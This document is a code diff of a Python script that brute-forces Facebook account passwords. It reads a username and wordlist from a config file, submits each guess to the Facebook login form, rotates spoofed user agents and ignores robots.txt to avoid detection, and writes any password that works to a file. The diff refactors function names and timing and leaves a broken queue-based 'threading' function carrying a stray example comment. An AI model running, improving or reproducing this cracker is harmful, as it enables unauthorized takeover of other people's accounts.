@@ -15,7 +15,7 @@ import ConfigParser
 import urllib2
 import socket
 import fileinput
-from multiprocessing import Process
+from multiprocessing import Process,Queue
 from pathlib import Path
 from bs4 import BeautifulSoup
 from lazyme.string import color_print
@@ -25,7 +25,7 @@ from random import choice
 #
 # The banner.
 #
-def def_banner():
+def banner():
 
 	os.system('clear')
 	color_print(" ______             _                 _    ____             _", color='green')       
@@ -42,7 +42,7 @@ def def_banner():
 #
 # Read in the config file.
 #
-def def_config ():
+def config ():
 	
 	# Read in the config file
 	global configParser
@@ -50,7 +50,6 @@ def def_config ():
 	configParser.read('config')
 
 	# Read in the username and wordlist from the config file.
-	global passwords
 	global dic_path
 	dic_path = configParser.get('Config','dict')
 	username = configParser.get('Config', 'user')
@@ -69,8 +68,8 @@ def def_config ():
 		#
 		# Start the crack
 		#
-		def_setup()
-		def_process(def_login)
+		setup()
+		threading(login)
 
 
 #
@@ -85,10 +84,20 @@ def internet_on():
     except OSError:
         pass
    	return False
+
+
+#
+# Sets a random user agent.
+#
+def random_user_agent(browser, agents):
+	random_user_agent = choice(agents)
+	browser.addheaders = [('User-agent', random_user_agent)]
+	color_print("[+] Using random user agent " + random_user_agent, color='blue')
+
 #
 # Setup the browser.
 #
-def def_setup():
+def setup():
 
 	if (internet_on() == True):
 			color_print("\n\n[+] Connection to server successfull", color='green')
@@ -107,23 +116,22 @@ def def_setup():
 
 	#	color_print("[+] Proxy setup on http://127.0.0.1:1234", color='green')
 
-	# Set the socket timeout.
-	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
-
 	# Setup Mechanize
 	global browser
 	browser = mechanize.Browser()
 
-	browser.set_handle_robots(False)
 	cookies = mechanize.CookieJar()
 	browser.set_cookiejar(cookies)
-	user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
-	random_user_agent = choice(user_agents)
-	color_print("[+] Using random user agent " + random_user_agent, color='blue')	
-	browser.addheaders = [('User-agent', random_user_agent)]
+	browser.set_handle_robots(False)	
 	browser.set_handle_refresh(True)
-	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 		
+
+	# Set a random user agent.
+	user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
+	random_user_agent(browser, user_agents)
+	
+
+
 	# Check if the config file has debugging turned on.
 	isDebugging = configParser.get('Config', 'debug')
 	if isDebugging == 'True':
@@ -136,7 +144,7 @@ def def_setup():
 	# Open up the facebook page.
 	url = 'http://www.facebook.com/login.php'
 	try:
-		browser.open(url)
+		browser.open(url, timeout=1)
 		browser.select_form(nr = 0)
 	except urllib2.URLError as e:
 		color_print("[!] Stopped!!! something went wrong? Try resetting your network interface", e.code, color='red')
@@ -146,17 +154,19 @@ def def_setup():
 
 
 #
-# MultiProcessing to speed up the crack
+# Use threading and queuing to speed up the crack
 #
-def def_process (f):
-	p = Process(target=f)
-	p.start()
-	p.join()
+def threading (f):
+    q = Queue()
+    p = Process(target=f)
+    p.start()
+    print(q.get())    # prints "[42, None, 'hello']"
+    p.join()
 
 #
 # Attempt to login with multiple passwords
 #
-def def_login():
+def login():
 
 
 	# read in the username from the config file.
@@ -175,6 +185,7 @@ def def_login():
 
 		# Submit the form.
  		request = browser.submit()
+		time.sleep(1)
 			
 
 		# Declare a BeautifulSoup Object.
@@ -196,7 +207,6 @@ def def_login():
 			color_print(action, color='red')
 			print("[!] Wrong password")
 			browser.select_form(nr = 0)
-			time.sleep(0.1)
 			continue	
 		else:
 
@@ -216,13 +226,10 @@ def def_login():
 			saveCreds.write(password)
 			saveCreds.close()
 			break
-
-		time.sleep(0.1)
-		browser.select_form(nr = 0)
 			
 			
 #
 # call the methods.
 #
-def_banner()
-def_config()
+banner()
+config()
